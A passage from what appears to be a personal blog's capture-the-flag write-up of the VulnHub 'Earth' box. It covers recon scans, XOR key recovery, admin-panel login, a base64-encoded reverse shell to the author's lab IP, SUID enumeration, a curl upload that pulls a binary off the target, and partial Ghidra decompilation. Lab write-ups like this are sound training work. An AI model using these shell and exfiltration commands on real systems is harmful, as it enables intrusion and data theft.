@@ -1,0 +1,446 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>WebsiteThiny</title>
+
+    <link rel="stylesheet" href="https://lexcona.com/styles/index.css">
+    <link rel="stylesheet" href="https://lexcona.com/styles/navbar.css">
+    <link rel="stylesheet" href="https://lexcona.com/styles/background.css">
+    <link rel="stylesheet" href="https://lexcona.com/styles/avatar-card.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
+
+    <script defer src="https://lexcona.com/scripts/cat-face-spawner.js"></script>
+    <script defer src="https://lexcona.com/scripts/random-cat.js"></script>
+
+    <link id="favicon" rel="shortcut icon" type="image/jpg" href="https://avatars.githubusercontent.com/u/229240464?v=4" />
+  </head>
+
+  <body class="">
+    <div id="background"></div>
+    <div id="navbar">
+    <a class="navbar-button" href="https://lexcona.com">
+        <div class="navbar-button-thing"><p>Home</p></div>
+    </a>
+    <a class="navbar-button" href="https://lexcona.com/blog">
+        <div class="navbar-button-thing"><p>Blog</p></div>
+    </a>
+    <a class="navbar-button" href="https://lexcona.com/write-ups">
+        <div class="navbar-button-thing"><p>Write Ups</p></div>
+    </a>
+</div>
+    <main>
+        
+<link rel="stylesheet" href="https://lexcona.com/styles/blog-page.css">
+<script defer src="https://lexcona.com/scripts/expand-imgs.js"></script>
+
+<article class="blog-post">
+  <h1 class="title">
+    The Planets: Earth (VulnHub)
+  </h1>
+  <p class="subtitle"><strong>November 18, 2026. 11:18 AM</strong></p>
+  <p>Earth is a box in side a series of box, made to be a medium level box which requires decryption messages, reverse engineering, and more. :3
+I would do the one you're supposed to do before this called Mercury but that is stuck as being virtual box only and I don't want to deal with virtual box's problems.</p>
+<p>Any ways without further ado lets get into the box.</p>
+<h1 id="0-discovery">0. Discovery</h1>
+<p>So first thing to do is figure out what the IP address is for this box. Personally i'm going to do this with <code>nmap -sn</code> but you can use any IP scanner.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-18 08:43 -0500</span></span>
+<span class="giallo-l"><span>Nmap scan report for 172.16.224.1</span></span>
+<span class="giallo-l"><span>Host is up (0.00035s latency).</span></span>
+<span class="giallo-l"><span>Nmap scan report for 172.16.224.130</span></span>
+<span class="giallo-l"><span>Host is up (0.00027s latency).</span></span>
+<span class="giallo-l"><span>Nmap done: 256 IP addresses (2 hosts up) scanned in 3.11 seconds</span></span></code></pre>
+<p>We can see that the
+Box IP: .130
+Mine: .1</p>
+<p>So let's scan the IP address, which personally I used <code>nmap -A</code> for this which is overkill but it's useful to extract some information. Basically -A is the kitchen sink of NMap, which means it runs -sV to detect the version, -O to detect the operating system, -sC runs the default nmap scripts, and --traceroute to as the name says run a traceroute.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-18 08:44 -0500</span></span>
+<span class="giallo-l"><span>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span></span>
+<span class="giallo-l"><span>RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span></span>
+<span class="giallo-l"><span>Nmap scan report for 172.16.224.130</span></span>
+<span class="giallo-l"><span>Host is up (2.6s latency).</span></span>
+<span class="giallo-l"><span>Not shown: 904 filtered tcp ports (no-response), 93 filtered tcp ports (host-unreach)</span></span>
+<span class="giallo-l"><span>PORT    STATE SERVICE  VERSION</span></span>
+<span class="giallo-l"><span>22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)</span></span>
+<span class="giallo-l"><span>| ssh-hostkey: </span></span>
+<span class="giallo-l"><span>|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)</span></span>
+<span class="giallo-l"><span>|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)</span></span>
+<span class="giallo-l"><span>80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span></span>
+<span class="giallo-l"><span>|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span></span>
+<span class="giallo-l"><span>|_http-title: Bad Request (400)</span></span>
+<span class="giallo-l"><span>443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span></span>
+<span class="giallo-l"><span>|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span></span>
+<span class="giallo-l"><span>| http-methods: </span></span>
+<span class="giallo-l"><span>|_  Potentially risky methods: TRACE</span></span>
+<span class="giallo-l"><span>|_http-title: Test Page for the HTTP Server on Fedora</span></span>
+<span class="giallo-l"><span>| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span></span>
+<span class="giallo-l"><span>| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span></span>
+<span class="giallo-l"><span>| Not valid before: 2021-10-12T23:26:31</span></span>
+<span class="giallo-l"><span>|_Not valid after:  2031-10-10T23:26:31</span></span>
+<span class="giallo-l"><span>|_ssl-date: TLS randomness does not represent time</span></span>
+<span class="giallo-l"><span>| tls-alpn: </span></span>
+<span class="giallo-l"><span>|_  http/1.1</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span>
+<span class="giallo-l"><span>Nmap done: 1 IP address (1 host up) scanned in 105.60 seconds</span></span></code></pre>
+<p>SSH is open so that is one attack vector.
+But it also seems like we are required to run with https so we got to modify our hosts file with the domains. Which I do this with a custom script but you can do it with modifying /etc/hosts if on a Unix based system. (<a href="/write-up-sources/ThePlanetsEarth/scripts/hosts.py">Hosts Script</a>)</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sudo</span><span style="color: #A6E3A1;"> python3 hosts.py -a -i</span><span style="color: #FAB387;"> 172.16.224.130</span><span style="color: #A6E3A1;"> -d &quot;terratest.earth.local,earth.local&quot; -c &quot;Earth CTF Domains&quot;</span></span></code></pre><h1 id="1-web-exploring">1. Web Exploring</h1>
+<p>Now lets dump the website to find anything interesting. Which other than seeing some encrypted data on the website doesn't seem interesting.
+Though on terratest there is no data on it, but there is a robots.txt</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>User-Agent: *</span></span>
+<span class="giallo-l"><span>Disallow: /*.asp</span></span>
+<span class="giallo-l"><span>Disallow: /*.aspx</span></span>
+<span class="giallo-l"><span>Disallow: /*.bat</span></span>
+<span class="giallo-l"><span>Disallow: /*.c</span></span>
+<span class="giallo-l"><span>Disallow: /*.cfm</span></span>
+<span class="giallo-l"><span>Disallow: /*.cgi</span></span>
+<span class="giallo-l"><span>Disallow: /*.com</span></span>
+<span class="giallo-l"><span>Disallow: /*.dll</span></span>
+<span class="giallo-l"><span>Disallow: /*.exe</span></span>
+<span class="giallo-l"><span>Disallow: /*.htm</span></span>
+<span class="giallo-l"><span>Disallow: /*.html</span></span>
+<span class="giallo-l"><span>Disallow: /*.inc</span></span>
+<span class="giallo-l"><span>Disallow: /*.jhtml</span></span>
+<span class="giallo-l"><span>Disallow: /*.jsa</span></span>
+<span class="giallo-l"><span>Disallow: /*.json</span></span>
+<span class="giallo-l"><span>Disallow: /*.jsp</span></span>
+<span class="giallo-l"><span>Disallow: /*.log</span></span>
+<span class="giallo-l"><span>Disallow: /*.mdb</span></span>
+<span class="giallo-l"><span>Disallow: /*.nsf</span></span>
+<span class="giallo-l"><span>Disallow: /*.php</span></span>
+<span class="giallo-l"><span>Disallow: /*.phtml</span></span>
+<span class="giallo-l"><span>Disallow: /*.pl</span></span>
+<span class="giallo-l"><span>Disallow: /*.reg</span></span>
+<span class="giallo-l"><span>Disallow: /*.sh</span></span>
+<span class="giallo-l"><span>Disallow: /*.shtml</span></span>
+<span class="giallo-l"><span>Disallow: /*.sql</span></span>
+<span class="giallo-l"><span>Disallow: /*.txt</span></span>
+<span class="giallo-l"><span>Disallow: /*.xml</span></span>
+<span class="giallo-l"><span>Disallow: /testingnotes.*</span></span></code></pre>
+<p>That makes me want to check out testingnotes which can either be .txt or .md.</p>
+<p>It was a .txt :3
+The notes document says</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>Testing secure messaging system notes:</span></span>
+<span class="giallo-l"><span>*Using XOR encryption as the algorithm, should be safe as used in RSA.</span></span>
+<span class="giallo-l"><span>*Earth has confirmed they have received our sent messages.</span></span>
+<span class="giallo-l"><span>*testdata.txt was used to test encryption.</span></span>
+<span class="giallo-l"><span>*terra used as username for admin portal.</span></span>
+<span class="giallo-l"><span>Todo:</span></span>
+<span class="giallo-l"><span>*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span></span>
+<span class="giallo-l"><span>*Need to test different key lengths to protect against bruteforce. How long should the key be?</span></span>
+<span class="giallo-l"><span>*Need to improve the interface of the messaging interface and the admin panel, it&#39;s currently very basic.</span></span></code></pre>
+<p>So this gives us a few hints, one of the encryption keys is at testdata.txt, terra is a username for a possible admin panel, and the encryption is XOR.</p>
+<p>Now lets head off to the website just to see how it looks
+<img src="/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_090523.png" alt="Main Page" /></p>
+<p>So a pretty basic website.</p>
+<p>After pulling down testdata.txt we got</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span></span></code></pre>
+<p>So let's pop it into cyberchef and see what we get
+<img src="/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_091131.png" alt="Cyber Chef Decoded" /></p>
+<p>We see we get the data</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span></span></code></pre>
+<p>which just repeats</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>earthclimatechangebad4humans</span></span></code></pre>
+<p>Well now that we are at a dead end lets through gobuster at it. Basically gobuster will send GET requests to different URLs and shows what stuff came back. Also, -b filters out any status code we supply so we don't get spammed with 403 false positives</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">gobuster</span><span style="color: #A6E3A1;"> dir --url https://earth.local --wordlist &quot;/mnt/SOLONGGAYBOWSER/Lists/SecLists/Discovery/Web-Content/combined_words.txt&quot; -b</span></span></code></pre>
+<p>which we get back</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>===============================================================</span></span>
+<span class="giallo-l"><span>Gobuster v3.8.2</span></span>
+<span class="giallo-l"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span>
+<span class="giallo-l"><span>===============================================================</span></span>
+<span class="giallo-l"><span>[+] Url:                     https://earth.local</span></span>
+<span class="giallo-l"><span>[+] Method:                  GET</span></span>
+<span class="giallo-l"><span>[+] Threads:                 10</span></span>
+<span class="giallo-l"><span>[+] Wordlist:                /mnt/SOLONGGAYBOWSER/Lists/SecLists/Discovery/Web-Content/combined_words.txt</span></span>
+<span class="giallo-l"><span>[+] Negative Status codes:   403,404</span></span>
+<span class="giallo-l"><span>[+] User Agent:              gobuster/3.8.2</span></span>
+<span class="giallo-l"><span>[+] Timeout:                 10s</span></span>
+<span class="giallo-l"><span>===============================================================</span></span>
+<span class="giallo-l"><span>Starting gobuster in directory enumeration mode</span></span>
+<span class="giallo-l"><span>===============================================================</span></span>
+<span class="giallo-l"><span>admin                (Status: 301) [Size: 0] [--&gt; /admin/]</span></span>
+<span class="giallo-l"><span>.                    (Status: 200) [Size: 2595]</span></span>
+<span class="giallo-l"><span>Progress: 128372 / 128372 (100.00%)</span></span>
+<span class="giallo-l"><span>===============================================================</span></span>
+<span class="giallo-l"><span>Finished</span></span>
+<span class="giallo-l"><span>===============================================================</span></span></code></pre>
+<p>I also ran it on terratest.earth.local to see if I get anything special, but didn't get anything I didn't know before.</p>
+<h1 id="2-admin-page">2. Admin Page</h1>
+<p>So time to go to earth.local/admin
+<img src="/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_094707.png" alt="earth.local admin login" /></p>
+<p>Which brought me to a page telling me to login, then I got reminded that the note said the username is terra. I'm going to guess the phrase that got repeated earlier in the decrypted data is the password, so lets see.</p>
+<p>THE LOGIN WAS CORRECT :3
+AND WE HAVE SHELL ACCESS</p>
+<p><img src="/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_094914.png" alt="earth.local/admin page" /></p>
+<p>so let's trying to get a reverse shell loaded, which I get the shells from <a rel="external" href="https://revshells.com">revshells.com</a> :3</p>
+<p><img src="/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_095133.png" alt="blocked" />
+and I got blocked :(</p>
+<p>So let's encode this in Base64</p>
+<p>In Unix you can encode and decode Base64 through the <code>base64</code> command.
+So we're going to encode it with</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">echo</span><span style="color: #A6E3A1;"> &quot;sh -i &gt;&amp; /dev/tcp/172.16.224.1/1234 0&gt;&amp;1&quot;</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> base64</span></span></code></pre>
+<p>Which the command basically just pipes the command into <code>base64</code> sense it only works with files and pipes.</p>
+<p>So now we got the encoded command
+<code>c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjIyNC4xLzEyMzQgMD4mMQo=</code></p>
+<p>So now we run the command with</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #F38BA8;font-style: italic;">echo</span><span style="color: #A6E3A1;"> &quot;c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjIyNC4xLzEyMzQgMD4mMQo=&quot;</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> base64</span><span style="color: #A6E3A1;"> -d</span><span style="color: #94E2D5;"> |</span><span style="color: #89B4FA;font-style: italic;"> sh</span></span></code></pre>
+<p>Which pipes the data into <code>base64</code> to decode it then into <code>sh</code> to run the command.</p>
+<p>and now we got remote access :3</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>Listening on 0.0.0.0 1234</span></span>
+<span class="giallo-l"><span>Connection received on 172.16.224.130 50220</span></span>
+<span class="giallo-l"><span>sh: cannot set terminal process group (938): Inappropriate ioctl for device</span></span>
+<span class="giallo-l"><span>sh: no job control in this shell</span></span>
+<span class="giallo-l"><span>sh-5.1$ </span></span></code></pre><h1 id="3-shell-exploitation">3. Shell Exploitation</h1>
+<p>So first things first, we setup interactive mode through the command</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">python</span><span style="color: #A6E3A1;"> -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre>
+<p>and now it's time to look through the system
+if we run <code>whoami</code> we see</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> whoami</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">apache</span></span></code></pre>
+<p>we are the apache user so lets see if we an elevate to a normal user.</p>
+<p>Before we do that I want to try to find the key.
+Which after looking in /var/earth_web/ we now got the first key :3</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">sh-5.1$</span><span style="color: #A6E3A1;"> cat /var/earth_web/user_flag.txt</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">cat</span><span style="color: #A6E3A1;"> /var/earth_web/user_flag.txt</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">[</span><span>user_flag_3353b67d6437f07ba7d34afd7d2fc27d</span><span style="color: #9399B2;">]</span></span></code></pre>
+<p>Now lets see if we can access another user.
+After looking in the home folder we find a user called earth. :3
+Downside we don't have access to the earth user :(
+So we are just going to have to get to root from that user so lets find a SUID applicaion.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">find</span><span style="color: #A6E3A1;"> / -perm -4000 -type f</span><span style="color: #94E2D5;"> 2&gt;</span><span style="color: #A6E3A1;">/dev/null</span></span></code></pre>
+<p>For those who don't know SUID will run the executable file that has the byte 4 at the start of the permission as the user's id that owns the file.</p>
+<p>and the find command came back with</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="plain"><span class="giallo-l"><span>/usr/bin/chage</span></span>
+<span class="giallo-l"><span>/usr/bin/gpasswd</span></span>
+<span class="giallo-l"><span>/usr/bin/newgrp</span></span>
+<span class="giallo-l"><span>/usr/bin/su</span></span>
+<span class="giallo-l"><span>/usr/bin/mount</span></span>
+<span class="giallo-l"><span>/usr/bin/umount</span></span>
+<span class="giallo-l"><span>/usr/bin/pkexec</span></span>
+<span class="giallo-l"><span>/usr/bin/passwd</span></span>
+<span class="giallo-l"><span>/usr/bin/chfn</span></span>
+<span class="giallo-l"><span>/usr/bin/chsh</span></span>
+<span class="giallo-l"><span>/usr/bin/at</span></span>
+<span class="giallo-l"><span>/usr/bin/sudo</span></span>
+<span class="giallo-l"><span>/usr/bin/reset_root</span></span>
+<span class="giallo-l"><span>/usr/sbin/grub2-set-bootflag</span></span>
+<span class="giallo-l"><span>/usr/sbin/pam_timestamp_check</span></span>
+<span class="giallo-l"><span>/usr/sbin/unix_chkpwd</span></span>
+<span class="giallo-l"><span>/usr/sbin/mount.nfs</span></span>
+<span class="giallo-l"><span>/usr/lib/polkit-1/polkit-agent-helper-1</span></span></code></pre>
+<p>All of those except reset_root are default Unix apps so no use in going for them in this case. Unless you want to find a vulnerability in the default Unix apps, which would take a lot longer than a basic custom app. Let's see if we can get the data of the file.</p>
+<p>After catting the file we can see it's a non stripped binary meaning we need to reverse engineer it. While I would show the output of the cat data, it was just mainly binary data so there isn't any use showing it.</p>
+<p>So what we will do is load up an upload server with</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">python3</span><span style="color: #A6E3A1;"> -m uploadserver</span><span> </span></span></code></pre>
+<p>and try to upload and send the executable to the host.
+After uploading the file with</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">curl</span><span style="color: #A6E3A1;"> -X POST http://172.16.224.1:8000/upload -F &#39;files=@/usr/bin/reset_root&#39;</span></span></code></pre><h1 id="4-reverse-engineering">4. Reverse Engineering</h1>
+<p>We now have it on our system.
+So let's pop it into Ghidra and see what we get.</p>
+<p>Which we see 2 main things, a function called main and another called magic_cipher.</p>
+<p>So lets look at magic_cipher first sense it's used a lot in main</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> magic_cipher</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">long</span><span style="color: #EBA0AC;font-style: italic;"> param_1</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">long</span><span style="color: #EBA0AC;font-style: italic;"> param_2</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">long</span><span style="color: #EBA0AC;font-style: italic;"> param_3</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> param_4</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> param_5</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span>  undefined4 local_c</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  for</span><span style="color: #9399B2;"> (</span><span>local_c </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> local_c </span><span style="color: #94E2D5;">&lt;</span><span> param_4</span><span style="color: #9399B2;">;</span><span> local_c </span><span style="color: #94E2D5;">=</span><span> local_c </span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">    *</span><span style="color: #9399B2;">(</span><span>byte </span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)(</span><span>param_3 </span><span style="color: #94E2D5;">+</span><span> local_c</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> =</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">         *</span><span style="color: #9399B2;">(</span><span>byte </span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)(</span><span>param_2 </span><span style="color: #94E2D5;">+</span><span> local_c </span><span style="color: #94E2D5;">%</span><span style="color: #9399B2;"> (</span><span>param_5 </span><span style="color: #94E2D5;">+ -</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">))</span><span style="color: #94E2D5;"> ^ *</span><span style="color: #9399B2;">(</span><span>byte </span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)(</span><span>param_1 </span><span style="color: #94E2D5;">+</span><span> local_c</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  return</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>Which after look at it for a bit it looks like an XOR cipher with param_3 being an output buffer, param_1 being input, and param_2 being a key.</p>
+<p>So with everything renamed we have</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="c"><span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> magic_cipher</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">long</span><span style="color: #EBA0AC;font-style: italic;"> input</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">long</span><span style="color: #EBA0AC;font-style: italic;"> key</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">long</span><span style="color: #EBA0AC;font-style: italic;"> outputBuffer</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> forLoopCount</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> length</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span>  undefined4 i</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  for</span><span style="color: #9399B2;"> (</span><span>i </span><span style="color: #94E2D5;">=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> i </span><span style="color: #94E2D5;">&lt;</span><span> forLoopCount</span><span style="color: #9399B2;">;</span><span> i </span><span style="color: #94E2D5;">=</span><span> i </span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">) {</span></span>
+<span class="giallo-l"><span style="color: #94E2D5;">    *</span><span style="color: #9399B2;">(</span><span>byte </span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)(</span><span>outputBuffer </span><span style="color: #94E2D5;">+</span><span> i</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> = *</span><span style="color: #9399B2;">(</span><span>byte </span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)(</span><span>key </span><span style="color: #94E2D5;">+</span><span> i </span><span style="color: #94E2D5;">%</span><span style="color: #9399B2;"> (</span><span>length </span><span style="color: #94E2D5;">+ -</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">))</span><span style="color: #94E2D5;"> ^ *</span><span style="color: #9399B2;">(</span><span>byte </span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)(</span><span>input </span><span style="color: #94E2D5;">+</span><span> i</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">  }</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  return</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span></code></pre>
+<p>So with that in mind lets tackle the behemoth that is main.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="c"><span class="giallo-l"></span>
+<span class="giallo-l"><span>undefined8 </span><span style="color: #89B4FA;font-style: italic;">main</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">void</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  int</span><span> iVar1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_10c5</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined4 local_10bd</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined1 local_10b9</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_10b8</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_10b0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined1 local_10a8</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_1098</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_1090</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined1 local_1088</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  char</span><span> local_1078 </span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">13</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span>  undefined1 local_106b</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined1 local_1067</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_78</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_70</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_68</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_60</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined1 local_58 </span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">17</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span>  undefined1 local_47</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_38</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_30</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined1 local_28</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined8 local_18</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  undefined4 local_10</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  int</span><span> local_c</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  </span></span>
+<span class="giallo-l"><span>  local_18 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">65756c62656c6170</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span>  local_10 </span><span style="color: #94E2D5;">=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">746f64</span><span style="color: #9399B2;">;</span></span>
